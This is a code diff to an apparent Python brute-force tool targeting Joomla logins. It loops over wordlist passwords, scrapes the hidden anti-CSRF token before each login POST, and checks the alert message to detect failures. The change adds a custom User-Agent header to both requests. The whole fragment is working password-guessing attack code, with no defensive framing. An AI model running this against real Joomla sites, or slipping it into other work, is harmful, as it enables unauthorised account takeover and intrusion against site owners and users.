@@ -73,11 +73,17 @@ class Joomla():
 
     def doGET(self):
         for password in self.getdata(self.wordlistfile):
-            #CSSRF
-            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
+            #Custom user-agent :)
+            headers = {
+                'User-Agent': 'nano'
+            }
+
+            #First GET for CSSRF
+            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
             soup = BeautifulSoup(r.text, 'html.parser')
             longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
             password=password.decode('utf-8')
+
             data = {
                 'username' : self.username,
                 'passwd' : password,
@@ -86,7 +92,7 @@ class Joomla():
                 'return' : self.ret,
                 longstring : 1
             }
-            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
+            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
             soup = BeautifulSoup(r.text, 'html.parser')
             response = soup.find('div', {'class': 'alert-message'})
             if response:
